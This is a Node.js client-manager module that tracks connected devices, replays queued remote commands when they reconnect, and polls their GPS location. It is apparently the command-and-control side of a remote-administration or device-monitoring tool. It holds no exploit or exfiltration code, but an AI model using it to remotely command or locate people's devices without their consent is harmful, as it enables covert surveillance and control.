// Refactored Client Manager using modular handlers
const config = require('./config');

// Import handler modules
const SocketEventHandlers = require('./handlers/socketEventHandlers');
const CommandManager = require('./handlers/commandManager');
const GpsManager = require('./handlers/gpsManager');
const DataManager = require('./handlers/dataManager');

class Clients {
    constructor(db, logManager = global.logManager) {
        this.clientConnections = {};
        this.clientDatabases = {};
        this.ignoreDisconnects = {};
        this.instance = this;
        this.db = db;
        this.logManager = logManager;

        // Initialize handler modules
        this.socketHandlers = new SocketEventHandlers(config, this.logManager);
        this.commandManager = new CommandManager(config, this.logManager);
        this.gpsManager = new GpsManager(config, this.logManager);
        this.dataManager = new DataManager(db);
    }

    // CONNECTION MANAGEMENT

    clientConnect(connection, clientID, clientData) {
        this.clientConnections[clientID] = connection;

        if (clientID in this.ignoreDisconnects) this.ignoreDisconnects[clientID] = true;
        else this.ignoreDisconnects[clientID] = false;

        console.log("Connected -> should ignore?", this.ignoreDisconnects[clientID]);

        let client = this.db.maindb.get('clients').find({ clientID });
        if (client.value() === undefined) {
            this.db.maindb.get('clients').push({
                clientID,
                firstSeen: new Date(),
                lastSeen: new Date(),
                isOnline: true,
                dynamicData: clientData
            }).write();
        } else {
            client.assign({
                lastSeen: new Date(),
                isOnline: true,
                dynamicData: clientData
            }).write();
        }

        let clientDatabase = this.getClientDatabase(clientID);
        this.setupListeners(clientID, clientDatabase);
    }

    clientDisconnect(clientID) {
        console.log("Disconnected -> should ignore?", this.ignoreDisconnects[clientID]);

        if (this.ignoreDisconnects[clientID]) {
            delete this.ignoreDisconnects[clientID];
        } else {
            this.logManager?.log(config.logTypes.info, clientID + " Disconnected");
            this.db.maindb.get('clients').find({ clientID }).assign({
                lastSeen: new Date(),
                isOnline: false,
            }).write();
            
            if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
            this.gpsManager.clearGpsPoller(clientID);
            delete this.ignoreDisconnects[clientID];
        }
    }

    getClientDatabase(clientID) {
        if (this.clientDatabases[clientID]) return this.clientDatabases[clientID];
        else {
            this.clientDatabases[clientID] = new this.db.clientdb(clientID);
            return this.clientDatabases[clientID];
        }
    }

    setupListeners(clientID, client) {
        let socket = this.clientConnections[clientID];

    this.logManager?.log(config.logTypes.info, clientID + " Connected");
        socket.on('disconnect', () => this.clientDisconnect(clientID));

        // Run the queued requests for this client
        let clientQueue = client.get('CommandQue').value();
        if (clientQueue.length !== 0) {
            this.logManager?.log(config.logTypes.info, clientID + " Running Queued Commands");
            clientQueue.forEach((command) => {
                let uid = command.uid;
                this.sendCommand(clientID, command.type, command, (error) => {
                    if (!error) client.get('CommandQue').remove({ uid: uid }).write();
                    else {
                        this.logManager?.log(config.logTypes.error, clientID + " Queued Command (" + command.type + ") Failed");
                    }
                });
            });
        }

        // Start GPS polling (if enabled)
        this.gpsManager.gpsPoll(this, clientID);

        // Setup all socket event handlers
        this.socketHandlers.setupAllHandlers(socket, clientID, client);
    }

    // DELEGATED METHODS (delegate to appropriate handler modules)

    // Data retrieval methods
    getClient(clientID) {
        return this.dataManager.getClient(clientID);
    }

    getClientList() {
        return this.dataManager.getClientList();
    }

    getClientListOnline() {
        return this.dataManager.getClientListOnline();
    }

    getClientListOffline() {
        return this.dataManager.getClientListOffline();
    }

    getClientDataByPage(clientID, page, filter = undefined) {
        return this.dataManager.getClientDataByPage(this, clientID, page, filter);
    }

    // Command methods
    sendCommand(clientID, commandID, commandPayload = {}, cb = () => { }) {
        return this.commandManager.sendCommand(this, clientID, commandID, commandPayload, cb);
    }

    // GPS methods
    setGpsPollSpeed(clientID, pollevery, cb) {
        return this.gpsManager.setGpsPollSpeed(this, clientID, pollevery, cb);
    }

    // Delete methods
    deleteClient(clientID) {
        return this.dataManager.deleteClient(this, clientID);
    }
}

module.exports = Clients;
